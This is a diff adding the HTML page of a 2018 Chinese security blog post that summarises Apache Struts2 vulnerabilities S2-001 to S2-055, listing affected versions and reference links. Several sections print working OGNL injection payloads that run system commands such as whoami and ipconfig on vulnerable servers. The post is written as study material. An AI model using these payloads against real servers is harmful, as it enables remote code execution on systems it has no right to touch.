@@ -1,0 +1,898 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Struts," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Struts 漏洞2017年Struts被爆出的漏洞比以往多了很多，抽时间整理一下其中的环境以及POC和漏洞分析，学习一下其中的漏洞原理分析和防御，以后如果再次爆发这样漏洞的时候，也能试着分析一下，不用再去傻傻的等着了。">
+<meta name="keywords" content="Struts">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Struts2 漏洞简单汇总">
+<meta property="og:url" content="http://yoursite.com/2018/01/09/Struts2-xxx/index.html">
+<meta property="og:site_name" content="Sec-note">
+<meta property="og:description" content="Struts 漏洞2017年Struts被爆出的漏洞比以往多了很多，抽时间整理一下其中的环境以及POC和漏洞分析，学习一下其中的漏洞原理分析和防御，以后如果再次爆发这样漏洞的时候，也能试着分析一下，不用再去傻傻的等着了。">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-1-8/83653243.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-1-8/44152038.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-1-8/82304633.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-1-8/43559389.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-1-9/44059606.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-1-9/43990420.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-1-9/80192149.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-1-9/26707957.jpg">
+<meta property="og:updated_time" content="2018-01-10T09:07:00.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Struts2 漏洞简单汇总">
+<meta name="twitter:description" content="Struts 漏洞2017年Struts被爆出的漏洞比以往多了很多，抽时间整理一下其中的环境以及POC和漏洞分析，学习一下其中的漏洞原理分析和防御，以后如果再次爆发这样漏洞的时候，也能试着分析一下，不用再去傻傻的等着了。">
+<meta name="twitter:image" content="http://opmi2ydgh.bkt.clouddn.com//18-1-8/83653243.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/01/09/Struts2-xxx/"/>
+
+
+
+
+
+  <title>Struts2 漏洞简单汇总 | Sec-note</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Sec-note</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/01/09/Struts2-xxx/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Sec-note">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sec-note">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Struts2 漏洞简单汇总</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-01-09T18:13:23+08:00">
+                2018-01-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全研究/" itemprop="url" rel="index">
+                    <span itemprop="name">安全研究</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h5 id="Struts-漏洞"><a href="#Struts-漏洞" class="headerlink" title="Struts 漏洞"></a>Struts 漏洞</h5><p>2017年<code>Struts</code>被爆出的漏洞比以往多了很多，抽时间整理一下其中的环境以及POC和漏洞分析，学习一下其中的漏洞原理分析和防御，以后如果再次爆发这样漏洞的时候，也能试着分析一下，不用再去傻傻的等着了。</p>
+<a id="more"></a>
+<p><a href="https://github.com/sie504/Struts-S2-xxx" target="_blank" rel="noopener">测试环境</a></p>
+<h5 id="Struts-漏洞列表"><a href="#Struts-漏洞列表" class="headerlink" title="Struts 漏洞列表"></a><a href="https://cwiki.apache.org/confluence/display/WW/Security+Bulletins" target="_blank" rel="noopener">Struts 漏洞列表</a></h5><ul>
+<li>S2-001 利用表单错误进行远程代码利用</li>
+<li>S2-002 标签 <code>&lt;s:url&gt;</code>和<code>&lt;s:a&gt;</code> XSS漏洞</li>
+<li>S2-003  <code>XWork ParameterInterceptors</code> 绕过导致<code>OGNL</code>执行</li>
+<li>S2-004 提供静态文件时目录遍历漏洞</li>
+<li>S2-005 <code>XWork ParameterInterceptors</code> 绕过远程代码执行</li>
+<li>S2-006 <code>XWork</code>生成错误页面时的XSS漏洞</li>
+<li>S2-007 当存在错误转换时，用户输入被当作<code>OGNL</code>执行</li>
+<li>S2-008 Struts2的一些严重(多个)</li>
+<li>S2-009 <code>ParameterInterceptor</code>漏洞允许远程代码执行</li>
+<li>S2-010 当使用 <code>Struts2 token</code>机制防护<code>CSRF</code>漏洞时，滥用已知会话属性可能绕过token检测</li>
+<li>S2-011 长请求参数名称可能会提高<code>DOS</code>攻击</li>
+<li>S2-012 <code>Showcase app</code>漏洞可能导致远程代码执行</li>
+<li>S2-013 存在于URL和Anchor Tag的includeParams属性中的漏洞允许远程执行命令</li>
+<li>S2-014 通过在URL和Anchor Tag中强制插入参数引入的漏洞允许远程命令执行，会话访问和操作以及XSS攻击</li>
+<li>S2-015 由通配符匹配机制引入的漏洞或OGNL Expression的双重评估允许远程命令执行。</li>
+<li>S2-016 通过操作带有前缀’action：’/‘redirect：’/‘redirectAction：’的参数引入的漏洞允许远程命令执行</li>
+<li>S2-017 - 通过操作以“redirect：”/“redirectAction：”为前缀的参数引入的漏洞允许打开重定向</li>
+<li>S2-018 Apache Struts2中的访问控制漏洞</li>
+<li>S2-019 - 默认禁用动态方法调用</li>
+<li>S2-020 将Common Commons FileUpload升级到版本1.3.1（避免DoS攻击），并添加“class”来排除ParametersInterceptor中的参数（避免ClassLoader操作）</li>
+<li>S2-021 - 改进ParametersInterceptor和CookieInterceptor中的排除参数以避免ClassLoader操作</li>
+<li>S2-022 - 在CookieInterceptor中扩展排除参数以避免操纵Struts内部</li>
+<li>S2-023 - 令牌的生成值可以预测</li>
+<li>S2-024 - 错误的excludeParams覆 DefaultExcludedPatternsChecker</li>
+<li>S2-025 - 调试模式下和暴露的JSP文件中的跨站点脚本漏洞</li>
+<li>S2-026中定义的错误 - 特殊顶级对象可用于访问Struts的内部结构</li>
+<li>S2-027 - TextParseUtil.translateVariables不会过滤恶意的OGNL表达式</li>
+<li>S2-028 - 使用具有破坏的URLDecoder实现的JRE可能导致基于Struts 2的Web应用程序出现XSS漏洞。 </li>
+<li>S2-029 - 对标签属性中的原始用户输入进行评估时，强制双重OGNL评估可能导致远程代码执行。 </li>
+<li>S2-030 - I18NInterceptor </li>
+<li>S2-031中可能的XSS漏洞 - XSLTResult可用于解析任意样式表</li>
+<li>S2-032 - 启用动态方法调用时，可以通过方法：前缀执行远程代码执行。 </li>
+<li>S2-033 - 使用REST插件时可以执行远程代码执行！运行时动态方法调用启用。 </li>
+<li>S2-034 - OGNL缓存中毒可能导致DoS漏洞</li>
+<li>S2-035 - 动作名称清理很容易出错</li>
+<li>S2-036 - 强制性双重OGNL评估，当对原始用户输入的标记属性进行评估时，可能会导致远程代码执行（类似于S2-029）</li>
+<li>S2-037 - 使用REST插件时可以执行远程代码执行。 </li>
+<li>S2-038 - 可以绕过令牌验证并执行CSRF攻击</li>
+<li>S2-039 - Getter作为操作方法导致安全绕过</li>
+<li>S2-040 - 使用现有默认操作方法进行输入验证旁路。</li>
+<li>S2-041 - 使用URLValidator </li>
+<li>S2-042 - 时可能发生DoS攻击 - Convention插件中可能的路径遍历</li>
+<li>S2-043 - 使用产品中的Config Browser插件</li>
+<li>S2-044 - 使用URLValidator </li>
+<li>S2-045时可能发生DoS攻击 - 基于Jakarta Multipart解析器执行文件上传时可能的远程执行代码。 </li>
+<li>S2-046 - 基于Jakarta Multipart解析器（类似于S2-045）执行文件上传时的可能RCE </li>
+<li>S2-047 - 使用URLValidator时可能的DoS攻击（类似于S2-044）</li>
+<li>S2-048 - 可能的RCE Struts展示应用程序Struts 2.3.x系列中的Struts 1插件示例</li>
+<li>S2-049 - DoS攻击可用于Spring受保护的操作</li>
+<li>S2-050 ​​ - 使用URLValidator时的正则表达式拒绝服务（类似于S2-044＆ S2-047）</li>
+<li>S2-051 - 当使用Struts REST插件时，远程攻击者可能通过发送精心设计的xml请求来创建DoS攻击</li>
+<li>S2-052 - 使用带XStream处理程序的Struts REST插件处理XML时可能发生的远程执行代码攻击有效载荷</li>
+<li>S2-053 - 在Freemarker标记中使用非意图表达而不是字符串文字时可能发生的远程执行代码攻击</li>
+<li>S2-054 - 使用Struts REST插件时，可以使用精心制作的JSON请求执行DoS攻击</li>
+<li>S2- 055 - Jacks中的RCE漏洞在JSON库上</li>
+</ul>
+<p>历史高危漏洞如下：<code>S2-001</code>、<code>S2-003</code>、<code>S2-005</code>、<code>S2-007</code>、<code>S2-008</code>，<code>S2-009</code>、<code>S2-012~S2-016</code>、<code>S2-019</code>、<code>S2-032</code>、<code>S2-033</code>、<code>S2-037</code>、<code>S2-045</code>、<code>S2-048</code>、<code>S2-052</code>、<code>S2-053</code>、<code>S2-055</code>。</p>
+<h5 id="S2-001"><a href="#S2-001" class="headerlink" title="S2-001"></a>S2-001</h5><p><a href="https://github.com/vulhub/vulhub/tree/master/struts2/s2-001" target="_blank" rel="noopener">S2-001环境复现</a></p>
+<p><a href="https://cwiki.apache.org/confluence/display/WW/S2-001" target="_blank" rel="noopener">官方链接</a></p>
+<p>该漏洞其实是因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value}<br>进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析。</p>
+<p><strong>影响版本</strong></p>
+<pre><code>Struts 2.0.0 - Struts 2.0.8
+</code></pre><p><strong> 测试 </strong></p>
+<p>获取 tomcat 执行路径:</p>
+<pre><code>%{&quot;tomcatBinDir{&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;}&quot;}
+</code></pre><p>获取 Web 路径:</p>
+<pre><code>%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&apos;/&apos;)),#response.flush(),#response.close()}
+</code></pre><p>命令执行</p>
+<pre><code>%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;whoami&quot;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
+</code></pre><p><img src="http://opmi2ydgh.bkt.clouddn.com//18-1-8/83653243.jpg" alt=""></p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-1-8/44152038.jpg" alt=""></p>
+<h5 id="S2-003"><a href="#S2-003" class="headerlink" title="S2-003"></a>S2-003</h5><p><strong>参考<a href="http://security.ctocio.com.cn/100/11466600.shtml" target="_blank" rel="noopener">Struts2和Webwork远程命令执行漏洞分析</a>、<a href="https://www.jianshu.com/p/c412c2961715" target="_blank" rel="noopener">Struts-S2-003漏洞利用（含环境搭建、含POC）</a>。</strong></p>
+<p><strong>影响版本</strong></p>
+<pre><code>Struts 2.0.0 - Struts 2.0.11.2
+2006/9/25    - 2008/6/23
+</code></pre><p><strong>漏洞介绍</strong></p>
+<p>Struts会将HTTP的每个参数名解析为ognl语句执行(可以理解为Java代码)。ognl表达式通过#来访问struts的对象，Struts框架通过过滤#字符防止安全问题，通过unicode编码(u0023)或8进制(43)即可绕过安全限制。</p>
+<p><strong> 环境搭建 </strong></p>
+<p><a href="http://archive.apache.org/dist/struts/binaries/struts-2.0.1-all.zip" target="_blank" rel="noopener">下载</a></p>
+<p>解压，将其中的<code>struts2-showcase-2.0.1.war</code> 拷贝到<code>\tomcat\webapps</code>下，这里重命名了<code>s2-003</code></p>
+<p><a href="https://www.jianshu.com/p/c412c2961715" target="_blank" rel="noopener">参考</a></p>
+<p>复现没有回显。</p>
+<h5 id="S2-005"><a href="#S2-005" class="headerlink" title="S2-005"></a>S2-005</h5><p><strong> 影响版本 </strong></p>
+<pre><code>Struts 2.0.0 - Struts 2.1.8.1
+</code></pre><p><a href="https://cwiki.apache.org/confluence/display/WW/S2-005" target="_blank" rel="noopener">官方链接</a></p>
+<p>S2-005是由于官方在修补S2-003不全面导致绕过补丁造成的。我们都知道访问Ognl的上下文对象必须要使用#符号，S2-003对#号进行过滤，但是没有考虑到unicode编码情况，导致\u0023或者8进制\43绕过。<br>S2-005则是绕过官方的安全配置（禁止静态方法调用和类方法执行），再次造成漏洞。</p>
+<p><strong>POC</strong></p>
+<pre><code>?(&apos;\u0023context[\&apos;xwork.MethodAccessor.denyMethodExecution\&apos;]\u003dfalse&apos;)(bla)(bla)&amp;(&apos;\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET&apos;)(kxlzx)(kxlzx)&amp;(&apos;\u0023_memberAccess.allowStaticMethodAccess\u003dtrue&apos;)(bla)(bla)&amp;(&apos;\u0023mycmd\u003d\&apos;ipconfig\&apos;&apos;)(bla)(bla)&amp;(&apos;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)&apos;)(bla)(bla)&amp;(A)((&apos;\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())&apos;)(bla))&amp;(B)((&apos;\u0023myres\u003dnew\40byte[51020]&apos;)(bla))&amp;(C)((&apos;\u0023mydat.readFully(\u0023myres)&apos;)(bla))&amp;(D)((&apos;\u0023mystr\u003dnew\40java.lang.String(\u0023myres)&apos;)(bla))&amp;(&apos;\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()&apos;)(bla)(bla)&amp;(E)((&apos;\u0023myout.getWriter().println(\u0023mystr)&apos;)(bla))
+</code></pre><p><img src="http://opmi2ydgh.bkt.clouddn.com//18-1-8/82304633.jpg" alt=""></p>
+<p>更改命令为whoami，提示下载文件。文件中含有执行命令的结果。</p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-1-8/43559389.jpg" alt=""></p>
+<h5 id="S2-007"><a href="#S2-007" class="headerlink" title="S2-007"></a>S2-007</h5><p><strong> 影响版本 </strong></p>
+<pre><code>Struts 2.0.0 - Struts 2.2.3
+</code></pre><p><a href="https://cwiki.apache.org/confluence/display/WW/S2-007" target="_blank" rel="noopener">官方链接</a></p>
+<p>当有转换错误时，用户输入被评估为OGNL表达式。这允许恶意用户执行任意代码。</p>
+<p>POC</p>
+<pre><code>&apos; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&apos;whoami&apos;).getInputStream())) + &apos;
+</code></pre><p><img src="http://opmi2ydgh.bkt.clouddn.com//18-1-9/44059606.jpg" alt=""></p>
+<p>会在age中得到相应的信息。</p>
+<h5 id="S2-008"><a href="#S2-008" class="headerlink" title="S2-008"></a>S2-008</h5><ul>
+<li><p>影响版本 </p>
+<p>  Struts 2.1.0 - Struts 2.3.1</p>
+</li>
+</ul>
+<p><a href="https://cwiki.apache.org/confluence/display/WW/S2-008" target="_blank" rel="noopener">官方链接</a></p>
+<p><a href="http://rickgray.me/review-struts2-remote-command-execution-vulnerabilities" target="_blank" rel="noopener">参考</a></p>
+<blockquote>
+<p>S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，正如 kxlzx 所提这种情况在生产环境中几乎不可能存在，因此就变得很鸡肋的，但我认为也不是绝对的，万一被黑了专门丢了一个开启了 debug 模式的应用到服务器上作为后门也是有可能的。</p>
+</blockquote>
+<blockquote>
+<p>例如在 devMode 模式下直接添加参数 ?debug=command&amp;expression= 会直接执行后面的 OGNL 表达式，因此可以直接执行命令（注意转义）：</p>
+</blockquote>
+<pre><code>/showcase.action?debug=command&amp;expression=(%23_memberAccess.allowStaticMethodAccess=true,%23context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=false,%23cmd=&quot;ipconfig&quot;,%23ret=@java.lang.Runtime@getRuntime().exec(%23cmd),%23data=new+java.io.DataInputStream(%23ret.getInputStream()),%23res=new+byte[1000],%23data.readFully(%23res),%23echo=new+java.lang.String(%23res),%23out=@org.apache.struts2.ServletActionContext@getResponse(),%23out.getWriter().println(%23echo))
+</code></pre><h5 id="S2-009"><a href="#S2-009" class="headerlink" title="S2-009"></a>S2-009</h5><p>影响版本: 2.1.0 - 2.3.1.1</p>
+<p><a href="https://github.com/sie504/vulhub/tree/master/struts2/s2-009" target="_blank" rel="noopener">S2-009</a></p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-1-9/43990420.jpg" alt=""></p>
+<h5 id="S2-012"><a href="#S2-012" class="headerlink" title="S2-012"></a>S2-012</h5><p>影响版本: 2.1.0 - 2.3.13</p>
+<p><a href="https://cwiki.apache.org/confluence/display/WW/S2-012" target="_blank" rel="noopener">官方链接</a></p>
+<pre><code>%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;whoami&quot;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
+</code></pre><p><img src="http://opmi2ydgh.bkt.clouddn.com//18-1-9/80192149.jpg" alt=""></p>
+<h5 id="S2-013-S2-014"><a href="#S2-013-S2-014" class="headerlink" title="S2-013,S2-014"></a>S2-013,S2-014</h5><p>影响版本： Struts 2.0.0 - Struts 2.3.14-Struts 2.0.0 - Struts 2.3.14.1</p>
+<p><a href="https://cwiki.apache.org/confluence/display/WW/S2-013" target="_blank" rel="noopener">S2-013</a></p>
+<p><a href="https://cwiki.apache.org/confluence/display/WW/S2-014" target="_blank" rel="noopener">S2-014</a></p>
+<p> POC</p>
+<pre><code>/link.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(&apos;calc&apos;).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(&apos;dbapp%3D&apos;%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D
+</code></pre><p><img src="http://opmi2ydgh.bkt.clouddn.com//18-1-9/26707957.jpg" alt=""></p>
+<h5 id="S2-016"><a href="#S2-016" class="headerlink" title="S2-016"></a>S2-016</h5><p>影响版本：Struts 2.0.0 - Struts 2.3.15</p>
+<p><a href="https://cwiki.apache.org/confluence/display/WW/S2-016" target="_blank" rel="noopener">官方链接</a></p>
+<p><a href="http://www.freebuf.com/vuls/11220.html" target="_blank" rel="noopener">S2-016</a></p>
+<h5 id="S2-032"><a href="#S2-032" class="headerlink" title="S2-032"></a>S2-032</h5><p>影响版本： Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)</p>
+<p><a href="https://cwiki.apache.org/confluence/display/WW/S2-032" target="_blank" rel="noopener">官方链接</a></p>
+<p><a href="http://blog.topsec.com.cn/ad_lab/apache-structs2-s2-032%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E5%8F%8A%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E8%84%9A%E6%9C%AC/" target="_blank" rel="noopener">Apache Struts2 s2-032技术分析及漏洞检测脚本</a></p>
+<h5 id="S2-037"><a href="#S2-037" class="headerlink" title="S2-037"></a>S2-037</h5><p>影响版本：Struts 2.3.20 - Struts Struts 2.3.28.1</p>
+<p><a href="https://cwiki.apache.org/confluence/display/WW/S2-037" target="_blank" rel="noopener">官网</a></p>
+<h5 id="S2-045"><a href="#S2-045" class="headerlink" title="S2-045"></a>S2-045</h5><p>影响版本: Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10</p>
+<p><a href="https://cwiki.apache.org/confluence/display/WW/S2-045" target="_blank" rel="noopener">官网</a></p>
+<h5 id="S2-052"><a href="#S2-052" class="headerlink" title="S2-052"></a>S2-052</h5><p>影响版本： Struts 2.1.2 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12</p>
+<p><a href="https://cwiki.apache.org/confluence/display/WW/S2-052" target="_blank" rel="noopener">官网</a></p>
+<h5 id="S2-053"><a href="#S2-053" class="headerlink" title="S2-053"></a>S2-053</h5><p>影响版本： Struts 2.0.1 - Struts 2.3.33, Struts 2.5 - Struts 2.5.10</p>
+<p><a href="https://cwiki.apache.org/confluence/display/WW/S2-053" target="_blank" rel="noopener">官网</a></p>
+<h5 id="S2-055"><a href="#S2-055" class="headerlink" title="S2-055"></a>S2-055</h5><p>影响版本：Struts 2.5 - Struts 2.5.14</p>
+<p><a href="https://cwiki.apache.org/confluence/display/WW/S2-055" target="_blank" rel="noopener">官网</a></p>
+<h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><p><a href="https://cwiki.apache.org/confluence/display/WW/Security+Bulletins" target="_blank" rel="noopener">Security Bulletins</a></p>
+<p><a href="https://www.jianshu.com/u/1c02feec61cd" target="_blank" rel="noopener">Struts漏洞</a></p>
+<p><a href="https://www.anquanke.com/post/id/86757" target="_blank" rel="noopener">浅谈struts2历史上的高危漏洞</a></p>
+<p><a href="https://github.com/apache/struts/releases" target="_blank" rel="noopener">struts各版本</a></p>
+<p><a href="http://archive.apache.org/dist/struts/" target="_blank" rel="noopener">struts各版本</a></p>
+<p><a href="http://www.zerokeeper.com/vul-analysis/struts2-command-execution-series-review.html" target="_blank" rel="noopener">Struts2 命令执行系列回顾</a></p>
+<p><a href="http://rickgray.me/review-struts2-remote-command-execution-vulnerabilities" target="_blank" rel="noopener">Struts2 历史 RCE 漏洞回顾不完全系列</a></p>
+<p><a href="https://github.com/vulhub/vulhub/tree/master/struts2" target="_blank" rel="noopener">Struts docker环境</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Struts/" rel="tag"># Struts</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/01/07/S2-052/" rel="next" title="S2-052 复现学习">
+                <i class="fa fa-chevron-left"></i> S2-052 复现学习
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/01/09/My-Blog/" rel="prev" title="Github+hexo">
+                Github+hexo <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Sec-note</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">60</span>
+                  <span class="site-state-item-name">posts</span>
